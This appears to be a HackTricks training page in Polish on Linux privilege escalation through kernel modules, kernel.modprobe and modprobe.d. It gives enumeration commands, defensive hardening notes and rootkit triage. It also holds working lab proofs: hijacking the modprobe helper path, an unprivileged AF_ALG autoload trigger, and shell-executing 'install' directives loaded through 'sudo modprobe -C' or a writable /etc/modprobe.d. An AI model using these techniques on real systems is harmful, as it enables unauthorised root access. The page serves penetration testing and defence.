# Nadużycia modułów jądra i modprobe

{{#include ../../banners/hacktricks-training.md}}

## Błędne konfiguracje modułów jądra i ich ładowania

Obsługa modułów jądra to obszar o dużym znaczeniu podczas analizy pod kątem eskalacji uprawnień w systemie Linux. Nie zakładaj, że każdy komunikat o niepodpisanym module sam w sobie oznacza możliwość wykorzystania; sprawdź, co można dzięki niemu ustalić w praktyce.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- Czy bieżący użytkownik może ładować moduły przez `sudo`, uprawnienia lub ścieżkę do zapisywalnego programu pomocniczego?
- Czy ładowanie modułów jest nadal włączone?
- Czy wymuszanie podpisu modułów jest wyłączone?
- Czy katalogi modułów, pliki modułów lub ścieżki konfiguracji `modprobe.d` są zapisywalne?<sup>[[16]](#references)</sup>
- Czy można odczytać logi jądra, aby potwierdzić, co się stało?

Szybka analiza wstępna obejmuje poniższe sprawdzenia stanu modułów, podpisów, logowania i drzewa modułów.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

Interpretacja:

- `modules_disabled=1` oznacza, że modułów nie można ani ładować, ani usuwać, a wartości nie można przywrócić do `0` przed ponownym uruchomieniem systemu.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` w wierszu poleceń jądra lub `CONFIG_MODULE_SIG_FORCE=y` wymaga modułów z prawidłowym podpisem; w przeciwnym razie mogą zostać załadowane niepodpisane moduły, co spowoduje oznaczenie jądra jako naruszonego.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` nie nakłada żadnych ograniczeń na `dmesg`; gdy wartość wynosi `1`, dostęp wymaga uprawnienia `CAP_SYSLOG`.<sup>[[1]](#references)</sup>
- Ścieżki z prawem zapisu w `/lib/modules/$(uname -r)/` są niebezpieczne, ponieważ podczas ładowania modułów `modprobe` przeszukuje to drzewo i zawarte w nim dane o zależnościach.<sup>[[8]](#references)</sup>

### Ładowanie modułu i odczytywanie danych wyjściowych jądra

Jeśli masz odpowiednie uprawnienia do załadowania lokalnego modułu, `insmod` wstawia dokładnie wskazany przez Ciebie plik `.ko`. Funkcja init modułu uruchamia się w ramach procesu ładowania, a komunikaty zapisywane za pomocą `printk()` trafiają do bufora dziennika jądra, który zazwyczaj odczytuje się poleceniem `dmesg`.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Minimalny proces weryfikacji obejmuje użycie `modinfo` do sprawdzenia metadanych, `insmod` i `rmmod` do załadowania i usunięcia modułu, `lsmod` do potwierdzenia, że moduł jest załadowany, oraz `dmesg` do sprawdzenia dzienników jądra.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

Jeśli `sudo -l` zezwala na użycie `insmod`, `modprobe` lub opakowującego je skryptu, potraktuj to jako krytyczne: `sudo -l` wyświetla uprawnienia użytkownika wywołującego polecenie, a załadowanie modułu jądra wymaga `CAP_SYS_MODULE`. Zobacz [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module), aby poznać bezpośrednie ścieżki oparte na capabilities.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### `insmod` dozwolony przez sudo

Reguła sudo umożliwiająca użytkownikowi uruchomienie `insmod` nie jest porównywalna z zezwoleniem na użycie zwykłego narzędzia administracyjnego. Kod inicjalizacyjny modułu jest wykonywany podczas jego wstawiania, dlatego w praktyce należy sprawdzić, czy użytkownik może wybrać lub zmodyfikować ładowany moduł.<sup>[[3]](#references)</sup>

Poniższy ogólny tok przeglądu powtarza kontrole inspekcji, ładowania, stanu, logów i usuwania dla kandydującego modułu.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

Jeśli użytkownik może dostarczyć dowolny plik `.ko`, podczas autoryzowanej oceny należy traktować to jako pełne przejęcie systemu. Bezpieczniejszym rozwiązaniem jest unikanie delegowania ładowania modułów przez sudo; jeśli nie da się tego uniknąć, należy ograniczyć dokładną ścieżkę, właściciela, uprawnienia, politykę podpisywania oraz procedurę usuwania.<sup>[[3]](#references)[[10]](#references)</sup>

Poniżej przedstawiono minimalny kod źródłowy i plik Makefile — nieszkodliwy wzorzec budowania modułu w kontrolowanym laboratorium. Forma `make -C /lib/modules/$(uname -r)/build M=$PWD` jest zgodna z udokumentowanym przez kernel przepływem pracy kbuild dla modułów zewnętrznych.<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Buduj i ładuj wyłącznie w autoryzowanym laboratorium; kbuild kompiluje moduł zewnętrzny, a polecenia ładowania i usuwania wywołują interfejsy modułów jądra.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### Kontrole pod kątem nadużyć `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` określa helper userspace, który kernel uruchamia na żądanie automatycznego ładowania modułu; ten sysctl wpływa na automatyczne ładowanie, a nie na jawne wstawianie modułów. Jeśli atakujący może zmienić tę wartość na ścieżkę do zapisywalnego pliku wykonywalnego i wywołać żądanie załadowania modułu, helper staje się uprzywilejowaną ścieżką wykonywania kodu. Ustawienie pustego ciągu wyłącza żądania automatycznego ładowania; jeśli `CONFIG_STATIC_USERMODEHELPER=y`, niepusta wartość zostaje zastąpiona ścieżką statycznego helpera wkompilowanego w kernel.<sup>[[1]](#references)</sup>

Sprawdź bieżącą ścieżkę helpera za pomocą interfejsu sysctl kernela oraz sprawdź właściciela i uprawnienia pliku docelowego.<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

Sprawdź, czy można wpływać na sysctl, delegowane reguły sudo lub capabilities plików.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

Poniższy wzorzec przeznaczony wyłącznie do laboratorium zmienia ścieżkę helpera i wyzwala udokumentowane żądanie automatycznego ładowania modułu; używaj go tylko w odizolowanym, autoryzowanym systemie.<sup>[[1]](#references)</sup>

W obecnych jądrach Linux nie używaj nieznanego pliku wykonywalnego jako ogólnego wyzwalacza: starszy mechanizm automatycznego ładowania modułów dla niestandardowych formatów binarnych został usunięty w Linux 6.14, a dokumentacja jądra wskazuje nieznany typ systemu plików jako ścieżkę żądania automatycznego ładowania modułu.<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

Na utwardzonych systemach powinno to się nie powieść, gdy uprawnienia uniemożliwiają nieuprzywilejowany zapis do `kernel.modprobe`, ścieżka helpera nie jest zapisywalna lub automatyczne ładowanie modułów jest wyłączone.<sup>[[1]](#references)</sup>

### Nieuprzywilejowany wyzwalacz autoloadingu AF_ALG

Opisany wyżej wyzwalacz systemu plików korzysta z uprzywilejowanego `mount`.<sup>[[1]](#references)</sup> Jeśli dostępne są gniazda AF_ALG, nieuprzywilejowany proces może zamiast tego powiązać gniazdo z celowo nieistniejącym typem.<sup>[[17]](#references)[[18]](#references)</sup> `alg_bind()` żąda wtedy `algif-<type>` przez `request_module()`, co wywołuje skonfigurowany helper modułów.<sup>[[17]](#references)[[18]](#references)[[19]](#references)</sup> Działa to również po usunięciu w Linuksie 6.14 mechanizmu autoloadingu dla nieznanych formatów binarnych.<sup>[[11]](#references)[[17]](#references)</sup> Oczekiwane jest niepowodzenie `bind()`, ponieważ dany typ nie istnieje; sprawdź efekt uboczny działania helpera, a nie wartość zwracaną przez gniazdo.<sup>[[17]](#references)[[18]](#references)</sup>

W autoryzowanym laboratorium najpierw skonfiguruj kontrolowany helper lub regułę `modprobe.d`, a następnie wywołaj pojedyncze żądanie bez `sudo` ani `CAP_SYS_MODULE`.<sup>[[17]](#references)[[18]](#references)</sup> Python 3.6+ akceptuje krotkę `(type, name)` dla powiązania AF_ALG.<sup>[[20]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe
cat /proc/sys/crypto/af_alg_restrict 2>/dev/null
python3 - <<'PYCODE'
import socket
with socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0) as s:
    try:
        s.bind(("htprobe", "unused"))
    except OSError as exc:
        print(f"bind returned: {exc}")
PYCODE
```

Ta ścieżka wymaga działającego gniazda AF_ALG i niepustej wartości `kernel.modprobe`.<sup>[[1]](#references)[[18]](#references)</sup> W jądrach z `/proc/sys/crypto/af_alg_restrict` wartość `2` wyłącza tworzenie gniazd AF_ALG; wartość `1` ogranicza dostępne algorytmy, ale nie blokuje żądania dotyczącego brakującego typu w `alg_bind()`.<sup>[[18]](#references)[[21]](#references)</sup> LSM może odrzucić żądanie załadowania modułu, zanim zostanie wywołany program pomocniczy.<sup>[[19]](#references)</sup>

### Zapisywalna konfiguracja `modprobe.d` i `sudo modprobe -C`

Przed rozstrzygnięciem, który moduł załadować, `modprobe` odczytuje pliki `.conf` z katalogów konfiguracyjnych, takich jak `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d` i `/lib/modprobe.d`, zgodnie z kolejnością priorytetów. Plik o tej samej nazwie w katalogu o wyższym priorytecie przesłania plik z katalogu o niższym priorytecie. Co ważniejsze, dyrektywa `install <module> <command>` uruchamia dowolne polecenie powłoki **zamiast** wstawienia modułu. Dlatego zapisywalna ścieżka konfiguracji może umożliwić opóźnione wykonanie polecenia z uprawnieniami późniejszego, uprzywilejowanego procesu `modprobe`; wymuszanie podpisów modułów jądra nie uwierzytelnia tego polecenia wykonywanego w przestrzeni użytkownika.<sup>[[16]](#references)</sup>

Sprawdź uprawnienia katalogów i plików, a następnie przeanalizuj aktywną konfigurację. `modprobe -n -v` jest bezpieczne do przeglądania sposobu rozstrzygania, ponieważ tryb próbny nie wstawia modułu ani nie wykonuje polecenia `install`/`remove`. Wybieraj `modprobe -c` zamiast starszej składni `--showconfig`, której usunięcie po wydaniu kmod 36 zapowiada aktualna dokumentacja kmod.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
    [ -e "$d" ] || continue
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```

Nieograniczona reguła sudo dla `modprobe` jest podatna na wykorzystanie, nawet jeśli dowolne pliki `.ko` nie przechodzą weryfikacji podpisu: `-C` wskazuje kontrolowany przez atakującego katalog konfiguracji, z którego proces uruchomiony przez sudo może wykonać polecenie `install`.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```

Jeśli katalog `modprobe.d`, widoczny dla pomocnika jądra, jest zapisywalny, ten sam [wyzwalacz automatycznego ładowania AF_ALG](#unprivileged-af_alg-autoload-trigger) może natychmiast wykonać dyrektywę `install algif-htprobe`, bez czekania, aż administrator wywoła `modprobe`.<sup>[[16]](#references)[[18]](#references)[[19]](#references)</sup> W autoryzowanym laboratorium umieść nieszkodliwe polecenie tworzące znacznik w zapisywalnym pliku `.conf`, potwierdź jego rozpoznanie za pomocą `modprobe -n -v algif-htprobe`, a następnie uruchom powyższy wyzwalacz.<sup>[[8]](#references)[[16]](#references)</sup> `modules_disabled=1` i wymuszanie podpisów modułów blokują wstawianie modułów, a nie to polecenie `install` wykonywane w przestrzeni użytkownika; pusta wartość `kernel.modprobe` lub zablokowana ścieżka AF_ALG uniemożliwia natomiast tę drogę automatycznego ładowania.<sup>[[1]](#references)[[2]](#references)[[16]](#references)[[18]](#references)[[19]](#references)</sup>

```bash
printf '%s\n' 'install algif-htprobe /bin/sh -c "id > /tmp/ht-modprobe-id"' > /etc/modprobe.d/zz-htprobe.conf
modprobe -n -v algif-htprobe
# Run the AF_ALG trigger above, then inspect /tmp/ht-modprobe-id.
```

W celu ograniczenia ryzyka nie przyznawaj przez sudo uprawnień do `modprobe` bez ograniczeń dotyczących argumentów, zadbaj, aby wszystkie katalogi konfiguracyjne należały do roota i nie były zapisywalne, oraz sprawdzaj nieoczekiwane dyrektywy `install`/`remove`. Gdy zaufana procedura administracyjna musi pominąć takie dyrektywy dla jednego modułu, `modprobe --ignore-install` ignoruje je dla wskazanego modułu, ale zależności mogą mieć własne polecenia.<sup>[[8]](#references)[[16]](#references)</sup>

### Przegląd zapisywalnych katalogów `/lib/modules`

Zapisywalne katalogi modułów mogą umożliwić podmianę modułu, umieszczenie złośliwego modułu lub nadużycie automatycznego ładowania — w zależności od późniejszego sposobu wywołania `modprobe`; podczas rozwiązywania nazw modułów `modprobe` przeszukuje `/lib/modules/$(uname -r)` i korzysta z zapisanych tam danych o zależnościach.<sup>[[8]](#references)</sup>

Sprawdź zapisywalne pliki modułów oraz metadane zależności i aliasów w drzewie modułów aktywnego wydania jądra.<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

Jeśli znajdziesz zapisywalną zawartość modułu, sprawdź, w jaki sposób modprobe rozwiązuje zależności i jak modinfo raportuje metadane modułu.<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

Uwagi dotyczące obrony:

- Zachowaj właściciela `/lib/modules` jako `root:root` i uniemożliw użytkownikom zapis.<sup>[[8]](#references)</sup>
- Ustaw `kernel.modules_disabled=1` po uruchomieniu systemu, jeśli jest to możliwe z punktu widzenia operacyjnego.<sup>[[1]](#references)</sup>
- Wymuszaj podpisywanie modułów w systemach, które wymagają ładowalnych modułów.<sup>[[2]](#references)</sup>
- Monitoruj zapisy do `/proc/sys/kernel/modprobe`, `/lib/modules` i katalogów konfiguracji `modprobe.d`, a także nieoczekiwane uruchomienia `insmod`/`modprobe`.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## Wstępna analiza rootkita opartego na module

Złośliwy moduł może przechwytywać wywołania systemowe, widoki VFS lub `/proc`, ścieżki sieciowe albo kontrole poświadczeń, aby ukrywać procesy i pliki, przekierowywać ruch lub przechwytywać sekrety. Może też usunąć się z listy modułów wyświetlanej przez `lsmod`. Mechanizmy trwałości mogą obejmować aliasy lub reguły instalacji w `modprobe.d`, `/etc/modules-load.d`, jednostkę systemd, zawartość initramfs albo podmianę legalnego pliku `.ko`. Prawidłowy wynik `lsmod` stanowi przydatny dowód, ale kompromitacja na poziomie jądra może sprawić, że listy udostępniane przez jądro będą niewiarygodne. Porównuj załadowane moduły, pliki na dysku, konfigurację rozruchu, dzienniki ładowania modułów i zaufane dane telemetryczne z zewnętrznych źródeł.

```bash
cat /proc/modules
lsmod
find /lib/modules/"$(uname -r)" -type f -name '*.ko*' -ls 2>/dev/null
grep -R -nE '^(install|softdep|blacklist|options) ' /etc/modprobe.d /run/modprobe.d /usr/lib/modprobe.d 2>/dev/null
find /etc/modules-load.d /usr/lib/modules-load.d -maxdepth 1 -type f -print 2>/dev/null
journalctl -k -b | grep -Ei 'module|taint|signature|lockdown'
cat /proc/sys/kernel/tainted
```

Przejrzyj nieoczekiwane nazwy modułów, ścieżki, zależności, sygnatury i czasy ładowania. Komunikaty o skażeniu jądra i niepodpisanych modułach są wskazówkami, a nie dowodem na obecność rootkita. Jeśli podejrzewasz rootkita, zbierz dowody z zaufanego obrazu lub środowiska odzyskiwania, zanim zaczniesz polegać na wynikach uzyskanych z działającego jądra. Strona [oceny podatności jądra](kernel-vulnerability-assessment.md) omawia konfigurację i ekspozycję diagnostyczną, w tym tracefs i przypięte obiekty BPF.



## References

- [1] [Dokumentacja /proc/sys/kernel/ — dokumentacja jądra Linux](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Mechanizm podpisywania modułów jądra — dokumentacja jądra Linux](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — strona podręcznika Linux](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Podstawy sterowników — dokumentacja jądra Linux](https://docs.kernel.org/driver-api/basics.html)
- [6] [Rejestrowanie komunikatów za pomocą printk — dokumentacja jądra Linux](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Budowanie modułów zewnętrznych — dokumentacja jądra Linux](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — strona podręcznika Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Scal tag „execve-v6.14-rc1” — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — strona podręcznika Linux](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
- [17] [Wskrzeszenie techniki modprobe_path: obejście poprawki search_binary_handler() — Theori](https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch)
- [18] [Powiązanie AF_ALG i żądanie modułu — kod źródłowy jądra Linux](https://github.com/torvalds/linux/blob/master/crypto/af_alg.c)
- [19] [Wywołanie pomocnika modułu — kod źródłowy jądra Linux](https://github.com/torvalds/linux/blob/master/kernel/module/kmod.c)
- [20] [socket — dokumentacja Pythona](https://docs.python.org/3/library/socket.html)
- [21] [/proc/sys/crypto/ — dokumentacja jądra Linux](https://docs.kernel.org/admin-guide/sysctl/crypto.html)
{{#include ../../banners/hacktricks-training.md}}
